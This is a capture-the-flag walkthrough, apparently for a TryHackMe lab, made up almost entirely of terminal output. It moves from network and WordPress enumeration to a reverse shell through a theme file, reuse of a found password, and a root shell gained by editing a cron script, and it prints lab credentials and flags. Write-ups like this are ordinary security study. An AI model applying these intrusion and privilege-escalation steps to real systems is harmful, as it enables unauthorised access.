
-------------------------------------------
ugu horayna waxaan scaning ku samenaynaa netwrk walib anigo isticmaalayo tool loo yaqaano nmap
```bash
21/tcp open  ftp     vsftpd 3.0.3
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:10.8.5.88
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 1
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
|_ftp-anon: Anonymous FTP login allowed (FTP code 230)
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 e2:5c:33:22:76:5c:93:66:cd:96:9c:16:6a:b3:17:a4 (RSA)
|   256 1b:6a:36:e1:8e:b4:96:5e:c6:ef:0d:91:37:58:59:b6 (ECDSA)
|_  256 fb:fa:db:ea:4e:ed:20:2b:91:18:9d:58:a0:6a:50:ec (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-title: Apache2 Ubuntu Default Page: It works
|_http-server-header: Apache/2.4.29 (Ubuntu)

```

```bash
┌──(alpha㉿Sploit)-[~/ctf/All_in_One]
└─$ curl http://10.10.126.62/hackathons
<html>
<body>

<h1>Damn how much I hate the smell of <i>Vinegar </i> :/ !!!  </h1>

<!-- Dvc W@iyur@123 -->
<!-- KeepGoing -->
</body>
</html>
```


The string is encrypted using Vigenere, with the key KeepGoing. We can decrypt the string using this site:
```bash
Encrypted string: Dvc W@iyur@123
Key: KeepGoing
Decrypted string: Try H@ckme@123
```

```bash
┌──(alpha㉿Sploit)-[~/ctf/All_in_One]
└─$ wpscan --url http://10.10.126.62/wordpress/ -e u            
_______________________________________________________________
         __          _______   _____
         \ \        / /  __ \ / ____|
          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
           \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
            \  /\  /  | |     ____) | (__| (_| | | | |
             \/  \/   |_|    |_____/ \___|\__,_|_| |_|

         WordPress Security Scanner by the WPScan Team
                         Version 3.8.25
       Sponsored by Automattic - https://automattic.com/
       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
_______________________________________________________________

[+] URL: http://10.10.126.62/wordpress/ [10.10.126.62]
[+] Started: Tue Jan 16 05:12:56 2024

Interesting Finding(s):

[+] Headers
 | Interesting Entry: Server: Apache/2.4.29 (Ubuntu)
 | Found By: Headers (Passive Detection)
 | Confidence: 100%

[+] XML-RPC seems to be enabled: http://10.10.126.62/wordpress/xmlrpc.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%
 | References:
 |  - http://codex.wordpress.org/XML-RPC_Pingback_API
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner/
 |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access/

[+] WordPress readme found: http://10.10.126.62/wordpress/readme.html
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] Upload directory has listing enabled: http://10.10.126.62/wordpress/wp-content/uploads/
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] The external WP-Cron seems to be enabled: http://10.10.126.62/wordpress/wp-cron.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 60%
 | References:
 |  - https://www.iplocation.net/defend-wordpress-from-ddos
 |  - https://github.com/wpscanteam/wpscan/issues/1299

[+] WordPress version 5.5.1 identified (Insecure, released on 2020-09-01).
 | Found By: Rss Generator (Passive Detection)
 |  - http://10.10.126.62/wordpress/index.php/feed/, <generator>https://wordpress.org/?v=5.5.1</generator>
 |  - http://10.10.126.62/wordpress/index.php/comments/feed/, <generator>https://wordpress.org/?v=5.5.1</generator>

[+] WordPress theme in use: twentytwenty
 | Location: http://10.10.126.62/wordpress/wp-content/themes/twentytwenty/
 | Last Updated: 2023-11-07T00:00:00.000Z
 | Readme: http://10.10.126.62/wordpress/wp-content/themes/twentytwenty/readme.txt
 | [!] The version is out of date, the latest version is 2.4
 | Style URL: http://10.10.126.62/wordpress/wp-content/themes/twentytwenty/style.css?ver=1.5
 | Style Name: Twenty Twenty
 | Style URI: https://wordpress.org/themes/twentytwenty/
 | Description: Our default theme for 2020 is designed to take full advantage of the flexibility of the block editor...
 | Author: the WordPress team
 | Author URI: https://wordpress.org/
 |
 | Found By: Css Style In Homepage (Passive Detection)
 |
 | Version: 1.5 (80% confidence)
 | Found By: Style (Passive Detection)
 |  - http://10.10.126.62/wordpress/wp-content/themes/twentytwenty/style.css?ver=1.5, Match: 'Version: 1.5'

[+] Enumerating Users (via Passive and Aggressive Methods)
 Brute Forcing Author IDs - Time: 00:00:01 <=========================================================================================> (10 / 10) 100.00% Time: 00:00:01

[i] User(s) Identified:

[+] elyana
 | Found By: Author Posts - Author Pattern (Passive Detection)
 | Confirmed By:
 |  Rss Generator (Passive Detection)
 |  Wp Json Api (Aggressive Detection)
 |   - http://10.10.126.62/wordpress/index.php/wp-json/wp/v2/users/?per_page=100&page=1
 |  Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 |  Login Error Messages (Aggressive Detection)

[!] No WPScan API Token given, as a result vulnerability data has not been output.
[!] You can get a free API token with 25 daily requests by registering at https://wpscan.com/register

[+] Finished: Tue Jan 16 05:13:30 2024
[+] Requests Done: 53
[+] Cached Requests: 6
[+] Data Sent: 15.029 KB
[+] Data Received: 398.283 KB
[+] Memory used: 196.422 MB
[+] Elapsed time: 00:00:33
```

![[All_in_One/img/2.png]]

```
└─$ nc -nlvp 1234               
listening on [any] 1234 ...
```

```
10.10.126.62/wordpress/wp-content/themes/twentytwenty/404.php
```

```bash
┌──(alpha㉿Sploit)-[~/ctf/All_in_One]
└─$ nc -nlvp 1234               
listening on [any] 1234 ...
connect to [10.8.5.88] from (UNKNOWN) [10.10.126.62] 38908
Linux elyana 4.15.0-118-generic #119-Ubuntu SMP Tue Sep 8 12:30:01 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux
 23:28:06 up 38 min,  0 users,  load average: 0.00, 0.00, 0.12
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$ python -m "import pty;pty.spawn('/bin/bash')"
/bin/sh: 1: python: not found
$ which python3
/usr/bin/python3
$ python3 -m "import pty;pty.spawn('/bin/bash')"
/usr/bin/python3: Error while finding module specification for "import pty;pty.spawn('/bin/bash')" (ModuleNotFoundError: No module named 'import pty;pty')
$ python3 -c "import pty;pty.spawn('/bin/bash')"
bash-4.4$ ls
ls
bin    dev   initrd.img      lib64       mnt   root  snap  tmp  vmlinuz
boot   etc   initrd.img.old  lost+found  opt   run   srv   usr  vmlinuz.old
cdrom  home  lib             media       proc  sbin  sys   var
bash-4.4$ cd /home
cd /home
bash-4.4$ ls
ls
elyana
bash-4.4$ cd elyana
cd elyana
bash-4.4$ ls
ls
hint.txt  user.txt
bash-4.4$ cat user.txt  
cat user.txt
cat: user.txt: Permission denied
bash-4.4$ cat hint.txt
cat hint.txt
Elyana's user password is hidden in the system. Find it ;)
bash-4.4$ find / -user elyana -type f 2>/dev/null
find / -user elyana -type f 2>/dev/null
/home/elyana/user.txt
/home/elyana/.bash_logout
/home/elyana/hint.txt
/home/elyana/.bash_history
/home/elyana/.profile
/home/elyana/.sudo_as_admin_successful
/home/elyana/.bashrc
/etc/mysql/conf.d/private.txt
bash-4.4$ cat /etc/mysql/conf.d/private.txt
cat /etc/mysql/conf.d/private.txt
user: elyana
password: E@syR18ght
bash-4.4$ su
su
Password: E@syR18ght

su: Authentication failure

```

```bash
┌──(alpha㉿Sploit)-[~/ctf/All_in_One]
└─$ sshpass -p "E@syR18ght" ssh elyana@10.10.126.62
Welcome to Ubuntu 18.04.5 LTS (GNU/Linux 4.15.0-118-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Mon Jan 15 23:32:26 UTC 2024

  System load:  0.04              Processes:           128
  Usage of /:   53.5% of 6.41GB   Users logged in:     0
  Memory usage: 67%               IP address for eth0: 10.10.126.62
  Swap usage:   0%


16 packages can be updated.
0 updates are security updates.


Last login: Fri Oct  9 08:09:56 2020
-bash-4.4$ ls
hint.txt  user.txt
-bash-4.4$ cat user.txt
VEhNezQ5amc2NjZhbGI1ZTc2c2hydXNuNDlqZzY2NmFsYjVlNzZzaHJ1c259
-bash-4.4$ cat user.txt | base64 -d
THM{49jg666alb5e76shrusn49jg666alb5e76shrusn}
-bash-4.4$ 
-bash-4.4$ sudo -l
Matching Defaults entries for elyana on elyana:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User elyana may run the following commands on elyana:
    (ALL) NOPASSWD: /usr/bin/socat
-bash-4.4$ cat /etc/crontab
# /etc/crontab: system-wide crontab
# Unlike any other crontab you don't have to run the `crontab'
# command to install the new version when you edit this file
# and files in /etc/cron.d. These files also have username fields,
# that none of the other crontabs do.

SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

# m h dom mon dow user  command
17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
*  *    * * *   root    /var/backups/script.sh

-bash-4.4$ cat var/backups/script.sh
cat: var/backups/script.sh: No such file or directory
-bash-4.4$ cat /var/backups/script.sh
#!/bin/bash

#Just a test script, might use it later to for a cron task 
-bash-4.4$ nano /var/backups/script.sh
-bash-4.4$ 
```


```bash
┌──(alpha㉿Sploit)-[~/ctf/All_in_One]
└─$ nc -lvnp 4444               
listening on [any] 4444 ...
connect to [10.8.5.88] from (UNKNOWN) [10.10.126.62] 44438
bash: cannot set terminal process group (2090): Inappropriate ioctl for device
bash: no job control in this shell
root@elyana:~# ls
ls
root.txt
root@elyana:~# cat root.txt
cat root.txt
VEhNe3VlbTJ3aWdidWVtMndpZ2I2OHNuMmoxb3NwaTg2OHNuMmoxb3NwaTh9
root@elyana:~# cat root.txt | base64 -d
cat root.txt | base64 -d
THM{uem2wigbuem2wigb68sn2j1ospi868sn2j1ospi8}
root@elyana:~#
```